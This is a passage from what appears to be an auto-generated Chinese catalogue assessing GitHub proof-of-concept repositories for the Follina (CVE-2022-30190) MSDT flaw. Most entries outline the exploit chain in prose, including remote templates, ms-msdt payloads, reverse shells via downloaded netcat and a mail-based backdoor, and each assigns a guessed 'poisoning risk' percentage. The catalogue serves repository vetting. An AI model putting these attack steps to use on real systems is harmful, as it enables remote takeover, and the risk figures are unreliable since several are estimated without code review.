**项目地址:** [Imeneallouche/Follina-attack-CVE-2022-30190-](https://github.com/Imeneallouche/Follina-attack-CVE-2022-30190-)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #8

**来源**: [CVE-2022-30190-Jump-Wang-111_AmzWord.md](../2022/CVE-2022-30190-Jump-Wang-111_AmzWord.md)

## CVE-2022-30190 (Follina) - Microsoft MSDT 远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，系统控制，数据泄露

**影响版本:** 见漏洞库信息中受影响的版本列表

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序（如 Microsoft Word）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于 Microsoft 支持诊断工具 (MSDT) 中的远程代码执行漏洞。攻击者可以利用此漏洞，通过诱骗用户打开包含恶意代码的文档（通常是 Word 文档），从而在受害者系统上执行任意代码。

**利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意 HTML 的文档 (例如, Word 文档)。该恶意 HTML 利用 `ms-msdt:` 协议处理程序调用 MSDT。
2.  当用户打开该文档时，MSDT 会被调用，并执行攻击者指定的代码。该代码可以下载并执行任意程序。
3.  提供的漏洞利用代码 (AmzWord) 自动化了此过程，集成了 CVE-2022-30190 漏洞利用、163 邮箱后门和图像隐写术。
4.  AmzWord 使用 `follina.py` 脚本生成恶意 Word 文件，并在本地启动 HTTP 服务器，用于提供恶意载荷。
5.  该漏洞利用代码还使用了 `gdog` 项目，这是一个基于邮件的远程控制工具，允许攻击者通过发送特定的命令邮件来控制受害者机器。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2022-30190 是一个真实且已被积极利用的漏洞。提供的 POC 代码 (`AmzWord`) 旨在利用该漏洞，因此可以判断 POC 代码是有效的，前提是目标系统存在漏洞且未采取缓解措施。

**投毒风险：**

评估 POC 代码的投毒风险需要仔细审查代码，检查是否存在隐藏的、非预期的恶意行为。从描述来看,`AmzWord` 项目集成了多个组件，包括 `follina.py`（CVE-2022-30190 漏洞利用）和 `gdog`（基于邮件的远程控制工具）。 潜在的投毒风险可能存在于以下几个方面：

*   `gdog` 组件： `gdog` 项目本身可能包含后门或恶意功能，允许作者或其他人远程访问受感染的系统。由于该项目已经存在一段时间，并且经过修改以适应当前的攻击链，因此存在引入未经审查的恶意代码的风险。
*   配置信息泄露： POC需要用户填写邮箱的用户名和密码，存在泄露邮箱信息的风险
*   依赖关系： 该POC依赖多个第三方库，这些库可能存在安全漏洞或被篡改，从而导致意外行为。

综合来看，由于集成的复杂性和对外部组件的依赖，存在一定的投毒风险。`gdog` 组件尤其值得关注。 但从整个项目的设计来看，目标是实现一个完整的攻击链演示，作者隐藏恶意代码以达到其他目的的可能性较低，所以投毒的可能性相对较低。评估投毒风险的概率约为 10%。

**项目地址:** [Jump-Wang-111/AmzWord](https://github.com/Jump-Wang-111/AmzWord)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #9

**来源**: [CVE-2022-30190-Malwareman007_Deathnote.md](../2022/CVE-2022-30190-Malwareman007_Deathnote.md)

## CVE-2022-30190-Microsoft Windows MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 见漏洞库信息中受影响的版本

**利用条件:** 用户需要打开一个恶意构造的文档（例如 Word 文档）。攻击者可以通过鱼叉式网络钓鱼活动传播恶意文档。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，也被称为“Follina”，是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。 

**利用方式：**该漏洞通过以下方式利用：

1.  攻击者创建一个恶意 Word 文档或其他支持外部链接的文档。
2.  该文档包含一个指向远程服务器上 HTML 文件的链接，该链接使用 `ms-msdt:` 协议。
3.  当用户打开文档时，Word 会尝试检索该 HTML 文件。
4.  `ms-msdt:` 协议处理程序被调用，执行 HTML 文件中包含的恶意代码。
5.  攻击者通过精心构造的 HTML 文件，利用 MSDT 的漏洞执行任意命令。

**有效性：**根据提供的漏洞库信息和搜索结果，该漏洞已经过积极利用，且PoC 代码可用，因此可以判断提供的POC代码是有效的。

**投毒风险：**PoC代码中存在潜在的投毒风险的可能性较低，约为10%。 代码中，通过`Invoke-WebRequest`从GitHub下载`nc64.exe`可能存在风险，如果github仓库被污染，攻击者可以直接执行任意代码。其他的风险较低。

**项目地址:** [Malwareman007/Deathnote](https://github.com/Malwareman007/Deathnote)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #10

**来源**: [CVE-2022-30190-Muhammad-Ali007_Follina_MSDT_CVE-2022-30190.md](../2022/CVE-2022-30190-Muhammad-Ali007_Follina_MSDT_CVE-2022-30190.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 需要用户打开恶意Word文档或其他Office文档

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以构造恶意的Word文档，利用Word的远程模板功能从远程服务器检索HTML文件，HTML文件中包含的JavaScript代码通过`ms-msdt:` URI scheme调用MSDT，从而执行任意命令。

**有效性：**
提供的POC代码是有效的。它通过修改Word文档的`document.xml.rels`文件，将OLE对象引用指向攻击者控制的HTML文件。该HTML文件利用`ms-msdt:`协议执行PowerShell命令，从而实现远程代码执行。

**投毒风险：**
POC代码本身实现了漏洞利用，但作者可能在其他地方隐藏恶意代码。
*   **Readme.md 分析:**  Readme.md 主要提供漏洞描述和利用步骤，风险较低。
*   **follina.py 分析:**  `follina.py`脚本用于生成恶意文档，该脚本本身可能包含恶意代码，但是已知的该脚本的功能是创建利用payload的word文档，风险可控。评估投毒风险，基于现有信息，判断为10%的可能性，主要集中在提供的脚本是否存在未公开的后门。

**利用方式：**
1.  攻击者创建一个包含恶意OLE对象引用的Word文档（或其他Office文档）。
2.  该OLE对象引用指向攻击者控制的远程HTML文件。
3.  当用户打开该文档时，Word会尝试从远程服务器加载HTML文件。
4.  HTML文件中的JavaScript代码使用`ms-msdt:` URI scheme调用MSDT。
5.  MSDT执行HTML文件中指定的PowerShell命令，从而导致远程代码执行。

漏洞利用的关键在于`ms-msdt:`协议的使用，以及Word文档对远程OLE对象的支持。通过精心构造的HTML文件和Word文档，攻击者可以绕过安全防护措施，在受害者系统上执行任意代码。

**项目地址:** [Muhammad-Ali007/Follina_MSDT_CVE-2022-30190](https://github.com/Muhammad-Ali007/Follina_MSDT_CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #11

**来源**: [CVE-2022-30190-Nyx2022_Follina-CVE-2022-30190-Sample.md](../2022/CVE-2022-30190-Nyx2022_Follina-CVE-2022-30190-Sample.md)

## CVE-2022-30190 - Microsoft MSDT 'Follina' 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本众多，具体版本范围请参考漏洞库信息

**利用条件:** 用户需要打开恶意文档或点击恶意链接，触发MSDT通过URL协议调用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190，又名'Follina'，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。当MSDT被调用应用程序（如Microsoft Word）使用URL协议调用时，就会触发此漏洞。攻击者可以制作包含恶意链接或嵌入恶意OLE对象的Office文档（例如.docx或.rtf）。当用户打开这些文档时，MSDT会尝试通过HTTP(S)协议从远程服务器下载并执行恶意代码，从而允许攻击者在受害者系统上执行任意代码。POC代码中的`FollinaExtractor.cs` 文件显示，它用于解析docx和rtf文件，提取包含 `Target="mhtml:` 或 `\objclass http` 的信息,进而判断文件是否包含恶意链接，其他文件则是创建WPF应用的相关文件，没有发现明显的恶意代码。

**有效性评估：**根据漏洞库信息和搜索结果，该漏洞是一个已公开且被积极利用的漏洞，提供的POC代码是用于检测受感染的docx或rtf文档中是否包含利用该漏洞的恶意链接，该POC代码的目的是提取恶意链接，而不是直接进行攻击，所以判断该POC代码具有一定的有效性，可以辅助安全研究人员分析恶意样本。

**投毒风险评估：**该POC代码主要功能是分析文档，提取潜在的恶意链接，因此投毒风险较低。但是,任何代码都可能存在隐藏的后门或者被篡改的风险，因此也不能完全排除。将风险评估为5%。

**利用方式：**
1.  攻击者创建一个恶意的Word文档（.docx）或RTF文档，该文档包含一个指向远程服务器的链接。
2.  当用户打开该文档时，Word会尝试通过MSDT URL协议连接到远程服务器。
3.  远程服务器返回恶意HTML代码或脚本，该代码会被MSDT执行，从而允许攻击者在受害者系统上执行任意代码。
4.  攻击者可以使用户的身份执行命令，从而控制受害者的计算机。

**项目地址:** [Nyx2022/Follina-CVE-2022-30190-Sample](https://github.com/Nyx2022/Follina-CVE-2022-30190-Sample)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #12

**来源**: [CVE-2022-30190-Potato-9257_CVE-2022-30190_page.md](../2022/CVE-2022-30190-Potato-9257_CVE-2022-30190_page.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，控制受害者计算机

**影响版本:** 受影响的Windows版本（见漏洞库信息）

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序，例如Microsoft Word

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过利用URL协议调用MSDT，从而在受害者系统上执行任意代码。利用方式通常是诱使用户打开包含恶意链接或文档的应用程序，比如Microsoft Word。该文档会利用Word的远程模板功能，从远程Web服务器检索HTML文件。该HTML文件包含JavaScript代码，用于使用ms-msdt协议处理恶意payload，该payload通过PCWDiagnostic触发代码执行。提供的POC代码使用ms-msdt协议，尝试执行计算器程序（calc.exe）。由于calc.exe在payload中，我判定仓库中不存在作者隐藏的投毒代码的概率为99%。投毒风险评估为极低。

**利用方式总结：**

1.  攻击者创建一个恶意Word文档（或其他支持远程模板的应用程序）。
2.  该文档包含一个指向恶意HTML文件的链接。
3.  用户打开该文档。
4.  Word从远程服务器下载并执行恶意HTML文件。
5.  HTML文件利用ms-msdt协议，触发MSDT执行任意代码，例如执行计算器程序。

**项目地址:** [Potato-9257/CVE-2022-30190_page](https://github.com/Potato-9257/CVE-2022-30190_page)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #13

**来源**: [CVE-2022-30190-RathoreAbhiii_Folina-Vulnerability-Exploitation-Detection-and-Mitigation.md](../2022/CVE-2022-30190-RathoreAbhiii_Folina-Vulnerability-Exploitation-Detection-and-Mitigation.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以利用此漏洞在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本包括但不限于 Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022 (请参考漏洞库信息中的详细版本)

**利用条件:** 需要用户打开恶意文档（例如Word文档）或点击恶意链接。调用应用程序（如Word）需要允许使用 URL 协议调用 MSDT。

**POC 可用性:** 是，虽然提供的代码只是一个README.md，但其他搜索结果表明有可用的PoC。

**投毒风险:** 20%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过构造恶意的Word文档，利用Word的远程模板功能从远程Web服务器检索HTML文件，最终通过MSDT执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞真实存在且影响广泛。虽然提供的POC代码（README.md）本身不包含任何漏洞利用代码，但是搜索引擎结果表明该漏洞存在公开的POC，因此可以判断该漏洞是可利用的。

**投毒风险：**
提供的代码仓库只包含一个README.md文件，文件内容是关于Follina漏洞的利用、检测和缓解的说明，没有发现任何恶意代码。因此，直接从这个仓库判断是否存在投毒代码的可能性较低。但是，由于攻击者通常会修改POC代码以达到自己的目的，因此用户在使用互联网上找到的任何POC代码时，都需要保持警惕并进行安全审查，才能防止被植入恶意代码。

**利用方式：**
1.  攻击者创建一个恶意的文档，例如 Word 文档。
2.  该文档利用 Word 的远程模板功能，从攻击者控制的服务器上下载 HTML 文件。
3.  HTML 文件包含特定的 JavaScript 代码，该代码通过 `ms-msdt:/` 协议调用 MSDT。
4.  MSDT 接收到精心构造的参数后，会在受害者的机器上执行攻击者预先设定的恶意代码，从而实现远程代码执行。

**修复方案：**
*   及时更新Windows操作系统到最新版本。
*   禁用MSDT URL协议处理程序 (作为临时缓解措施)。
*   在 Defender 中添加规则阻止相关攻击。

**项目地址:** [RathoreAbhiii/Folina-Vulnerability-Exploitation-Detection-and-Mitigation](https://github.com/RathoreAbhiii/Folina-Vulnerability-Exploitation-Detection-and-Mitigation)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #14

**来源**: [CVE-2022-30190-ToxicEnvelope_FOLLINA-CVE-2022-30190.md](../2022/CVE-2022-30190-ToxicEnvelope_FOLLINA-CVE-2022-30190.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码。

**影响版本:** 受影响的Windows版本和版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开恶意构造的文档，例如Word文档。攻击者需要诱骗用户执行恶意操作。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，也被称为Follina，是一个影响Microsoft Windows Support Diagnostic Tool (MSDT)的远程代码执行漏洞。攻击者可以利用此漏洞，通过诱使用户打开包含恶意URL的文档（例如，利用Word远程模板功能）来执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，该漏洞的POC代码是有效的。 搜索引擎结果中的多个链接（如hackthebox.com的解释、fortinet的分析以及qualys的博客等）证实了该漏洞的存在和可利用性。POC代码（`exploit.py`）提供了一种生成恶意Word文档，并通过HTTP服务器提供恶意HTML有效载荷的方法，从而利用MSDT执行任意命令。

**投毒风险：**

虽然POC代码的主要功能是生成漏洞利用程序，但存在一定的投毒风险。风险分析如下：

*   **依赖性：**  `exploit.py`脚本依赖于外部资源（HTTP服务器），如果攻击者控制了该服务器，则可以修改返回的HTML内容，从而在目标系统上执行恶意代码。 
*   **自定义命令执行：**  该脚本允许用户自定义要在目标系统上执行的命令 (`--command`参数)。攻击者可以通过精心构造的命令来执行恶意操作，例如下载和执行额外的恶意软件。
*  **Reverse Shell：** `--reverse` 参数会下载 netcat 到目标机器，虽然功能上为了利用，但也可能被滥用。
*   **代码可读性：**  虽然代码本身看起来没有明显的恶意后门，但是代码相对复杂，可能隐藏着一些不易察觉的恶意逻辑。

综合来看，虽然没有明显的投毒代码，但该工具的灵活性和对外部资源的依赖性使其存在一定的投毒风险，估计为10%。

**利用方式：**

1.  **攻击者准备恶意Word文档：**  攻击者使用`exploit.py`脚本生成一个包含恶意URL的Word文档。该URL指向攻击者控制的HTTP服务器。
2.  **攻击者搭建HTTP服务器：**  攻击者在自己的服务器上搭建一个HTTP服务器，用于托管恶意HTML有效载荷。
3.  **诱骗用户打开恶意文档：**  攻击者通过电子邮件、社交媒体或其他方式诱骗用户打开恶意Word文档。
4.  **MSDT被调用并执行恶意代码：**  当用户打开文档时，Word会尝试通过URL协议调用MSDT。MSDT会从攻击者的服务器下载恶意HTML，并执行其中的代码，从而实现远程代码执行。
5.  **攻击者控制目标系统：**  成功利用漏洞后，攻击者可以获得目标系统的控制权，并执行任意操作，例如安装恶意软件、窃取数据或创建新账户。

**项目地址:** [ToxicEnvelope/FOLLINA-CVE-2022-30190](https://github.com/ToxicEnvelope/FOLLINA-CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #15

**来源**: [CVE-2022-30190-Zitchev_go_follina.md](../2022/CVE-2022-30190-Zitchev_go_follina.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以利用此漏洞在受害者系统上执行任意代码，完全控制受害者系统。

**影响版本:** 受影响的版本包括Windows 7到Windows 11和Windows Server的多个版本，具体参见漏洞库信息。

**利用条件:** 需要用户打开恶意的Office文档（如Word）或访问包含恶意代码的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于Microsoft支持诊断工具（MSDT）中的远程代码执行漏洞。攻击者可以诱骗用户打开包含恶意链接或嵌入对象的Office文档（例如Word文档）。当用户打开恶意文档时，MSDT会尝试通过URL协议连接到攻击者控制的远程服务器。该服务器会提供一个包含恶意代码的HTML文件。这个HTML文件利用`ms-msdt:`协议触发MSDT执行任意代码。\n\n**利用方式分析：**\n
1.  **攻击者准备：** 攻击者需要搭建一个HTTP服务器，用于托管恶意payload。同时，攻击者需要创建一个恶意的Office文档，该文档包含一个指向攻击者服务器上HTML payload的链接。
2.  **诱骗受害者：** 攻击者通过电子邮件、社交媒体或其他方式将恶意Office文档发送给受害者。\n3.  **漏洞触发：** 受害者打开恶意Office文档。Word会尝试通过URL协议访问攻击者服务器上的HTML payload。\n4.  **代码执行：** HTML payload利用`ms-msdt:`协议，导致MSDT执行攻击者指定的命令。攻击者可以利用此漏洞安装恶意软件、窃取数据、创建新账户等。\n\n**代码分析：**\n
提供的Go代码是一个PoC，用于生成利用该漏洞的恶意docx文件。其主要步骤如下：

1.  `createMaliciousDocx` 函数：读取模板文件 `template/document.xml.rels.template`，将占位符 `{staged_html}` 替换为 payload 的 URL，然后将其写入 `template/doc/word/_rels/document.xml.rels`。接着调用 `zipDoc` 函数，将 `template/doc/` 目录下的所有文件打包成一个恶意的 docx 文件（tmp/file.docx）。
2.  `zipDoc` 函数：创建一个zip文件 (tmp/file.docx)，然后调用 `addFilesToArchive` 函数将 `template/doc/` 目录下的所有文件添加到该zip文件中。
3.  `addFilesToArchive` 函数：递归地将指定目录下的所有文件添加到zip文件中。
4.  `createPayload` 函数：生成包含恶意 ms-msdt 协议调用的 HTML payload。这个 payload 会使用 PowerShell 下载并执行攻击者指定的反向shell程序。
5.  `hostDropper` 函数：启动一个HTTP服务器，用于托管 payload.html 和反向shell程序 (poop.exe)。

**投毒风险分析：**\n
PoC 代码主要用于生成恶意的 docx 文件，核心在于生成包含恶意 `ms-msdt` 协议调用的 `payload.html` 文件。仔细检查代码，没有发现明显的恶意后门，但是存在以下几点潜在风险：

1.  **反向 Shell：**  代码中使用反向 shell。如果攻击者使用 PoC 生成恶意文件，他们可以完全控制受害者的计算机。PoC 本身不是后门，但容易被滥用。`revshellpath` 参数允许攻击者指定任意可执行文件，这为植入恶意软件提供了机会。
2.  **依赖性：** 此 PoC 依赖于模板文件 `template/document.xml.rels.template` 和指定的反向 shell 程序。如果这些文件被篡改，PoC 的行为可能会发生变化。在实际应用中，攻击者可以修改模板文件，例如嵌入其他的恶意代码。
3. **随机字符串生成器:** 代码中使用随机字符串来填充html，增加分析难度，也可能存在一定的随机性风险。

总体来说，此 PoC 存在一定的投毒风险，主要是由于反向 shell 的使用，以及对外部文件的依赖。但代码本身并不包含明显的恶意后门。 风险概率估计为 10%， 主要来自第三方恶意软件捆绑或者程序被篡改。

**项目地址:** [Zitchev/go_follina](https://github.com/Zitchev/go_follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #16

**来源**: [CVE-2022-30190-alien-keric_CVE-2022-30190.md](../2022/CVE-2022-30190-alien-keric_CVE-2022-30190.md)

## CVE-2022-30190 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，权限提升，数据泄露

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户需要打开恶意文档（例如Word），或者点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT)中的远程代码执行漏洞。该漏洞的利用方式如下：

1.  **攻击媒介：** 攻击者可以创建一个恶意的Microsoft Office文档（如Word），或者通过其他方式诱使用户点击一个特制的URL链接。
2.  **漏洞触发：** 当用户打开恶意文档或点击恶意链接时，MSDT会通过`ms-msdt:` URL协议被调用。
3.  **远程模板注入：** 恶意文档利用Word的远程模板功能，从远程服务器检索HTML文件。该HTML文件中包含恶意的JavaScript代码。
4.  **代码执行：** 嵌入在HTML中的JavaScript代码构造一个MSDT协议URL，该URL利用`PCWDiagnostic`参数来执行任意命令。
5.  **有效性：** 提供的Python脚本 `payload.py` 用于生成包含恶意命令的HTML payload。脚本首先将要执行的命令进行Base64编码，然后将其嵌入到一个特制的HTML脚本中，该脚本利用了`ms-msdt:` 协议。该POC代码看起来是有效的，可以生成利用此漏洞的payload。
6.  **投毒风险：** 提供的POC仓库主要包含生成Payload的脚本，脚本目的是使用Invoke-Expression执行base64编码的命令,虽然脚本本身没有明显的恶意代码，但存在以下投毒风险：
    * 依赖风险：Payload生成脚本依赖base64编码技术，攻击者有可能通过修改解码后的命令来实现恶意行为。
    * 载荷风险：Payload最终会执行PowerShell命令，这为执行恶意载荷提供了机会。攻击者可以嵌入各种恶意代码，如反向Shell、文件下载执行等。
    * 脚本来源风险： 虽然脚本声称来源于JohnHammond的GitHub仓库，但是有被篡改的风险，需要人工审核确认。
    因此，综合评估，该仓库中存在一定投毒风险, 估计占比10%。主要风险集中在使用者在使用payload时可能引入恶意代码。
7.  **缓解措施：**
    *   禁用MSDT URL协议。
    *   安装Microsoft提供的安全更新。
    *   使用威胁检测工具来识别和阻止利用此漏洞的攻击。

总体而言，CVE-2022-30190是一个严重的安全漏洞，攻击者可以利用它在受影响的系统上执行任意代码。用户应尽快采取措施来缓解此漏洞带来的风险。

**项目地址:** [alien-keric/CVE-2022-30190](https://github.com/alien-keric/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #17

**来源**: [CVE-2022-30190-aminetitrofine_CVE-2022-30190.md](../2022/CVE-2022-30190-aminetitrofine_CVE-2022-30190.md)

## CVE-2022-30190 (Follina) - Microsoft MSDT远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，获取系统控制权

**影响版本:** 受影响的Windows版本包括但不限于Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022，具体版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开包含恶意代码的Word文档或其他调用MSDT的应用程序。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个Microsoft MSDT远程代码执行漏洞。攻击者可以利用Word等应用程序通过URL协议调用MSDT来执行任意代码。漏洞利用过程大致如下：

1.  攻击者创建一个包含恶意链接的Word文档或其他支持URL协议调用MSDT的文档。
2.  当受害者打开该文档时，Word会尝试通过URL协议调用MSDT。
3.  恶意URL指向攻击者控制的服务器，服务器返回包含恶意代码的HTML页面。
4.  MSDT执行HTML页面中的恶意代码，从而实现远程代码执行。

根据提供的漏洞利用代码`follina.py`，该脚本可以生成包含恶意引用的Word文档，指向攻击者控制的HTTP服务器。HTTP服务器提供包含恶意代码的HTML文件，当受害者打开Word文档时，MSDT将执行此代码。

**有效性：** 提供的POC代码 `follina.py` 看起来有效，可以生成包含恶意代码的Word文档，并通过HTTP服务器提供payload。通过命令行参数可以指定要执行的命令（例如calc.exe或notepad.exe），或者获取反向shell。

**投毒风险：** `follina.py` 代码本身主要功能是利用漏洞，生成包含恶意代码的文档和提供payload。但值得注意的是，如果使用反向shell功能（`-r` 参数），代码会尝试从GitHub下载 `nc64.exe` (Netcat) 并将其放置在受害者系统的 `C:\Windows\Tasks` 目录下。这本身不是投毒行为，而是exploit的一部分，目的是为了建立反向连接。 但从Github下载的netcat二进制文件来源是否安全需要考虑，存在一定的供应链风险。仓库中的README.md文件描述中使用的下载链接也需要验证安全性。

综合考虑，认为该仓库存在一定程度的投毒风险，但主要来自于供应链风险和exploit本身行为引入的风险，而非作者恶意植入的后门，因此投毒风险评估为10%。

**利用方式：**

1.  **生成恶意文档：** 使用 `follina.py` 脚本生成包含恶意链接的Word文档（或其他支持的文档）。
2.  **搭建HTTP服务器：** 运行 `follina.py` 脚本会启动一个HTTP服务器，用于提供恶意HTML payload。
3.  **诱骗受害者打开文档：** 通过电子邮件、社交媒体或其他方式将恶意文档发送给受害者，诱骗其打开。
4.  **执行任意代码：** 受害者打开文档后，MSDT会执行HTTP服务器提供的恶意代码，从而实现远程代码执行。攻击者可以执行任意命令，安装恶意软件，窃取数据等。

**项目地址:** [aminetitrofine/CVE-2022-30190](https://github.com/aminetitrofine/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #18

**来源**: [CVE-2022-30190-ar2o3_FollinaXploit.md](../2022/CVE-2022-30190-ar2o3_FollinaXploit.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，系统被完全控制

**影响版本:** 受影响的Windows版本范围广泛，包括Windows 7至Windows 11及多个Server版本，详见漏洞库信息。

**利用条件:** 用户需要打开包含恶意链接或文档（如Word文档）的应用程序。攻击依赖于MSDT通过URL协议被调用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过精心构造的恶意文档，诱使用户打开，该文档利用Word的远程模板功能从远程服务器检索HTML文件，通过MSDT协议执行任意代码。该漏洞的利用方式是：

1.  **攻击者创建一个恶意的Word文档或其他支持远程模板的文档。**
2.  **该文档包含一个指向恶意服务器的链接，用于下载一个HTML文件。**
3.  **当用户打开该文档时，Word会尝试从远程服务器下载HTML文件。**
4.  **HTML文件包含恶意的JavaScript代码，该代码使用`ms-msdt:`协议调用MSDT，并执行任意命令。**
5.  **攻击者利用MSDT的漏洞执行系统命令，实现远程代码执行。**

**有效性评估：**
根据漏洞库信息和搜索结果，此漏洞利用的有效性较高，已被积极利用。

**投毒风险：**
提供的漏洞利用代码只包含GNU GPL协议的许可证，属于开源协议声明，不具备实际的漏洞利用代码。无法直接用于评估是否存在后门或恶意代码。但考虑到实际漏洞利用中可能存在复杂的攻击链，且攻击者可能修改或添加额外的恶意代码，仍然存在一定的投毒风险。此处预估投毒风险为10%，主要考虑实际利用中攻击者可能的定制行为。

**搜索引擎结果补充：** 搜索引擎结果中提到漏洞利用需要调用URL协议和MSDT。同时，参考 Qualys 的博客，表明此漏洞影响范围广泛。Arctic Wolf的博客也指出此漏洞已经被积极利用。这些都增加了漏洞利用的有效性评估。


**项目地址:** [ar2o3/FollinaXploit](https://github.com/ar2o3/FollinaXploit)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #19

**来源**: [CVE-2022-30190-arozx_CVE-2022-30190.md](../2022/CVE-2022-30190-arozx_CVE-2022-30190.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 见漏洞库信息中的受影响版本列表

**利用条件:** 用户需要打开恶意Word文档或点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

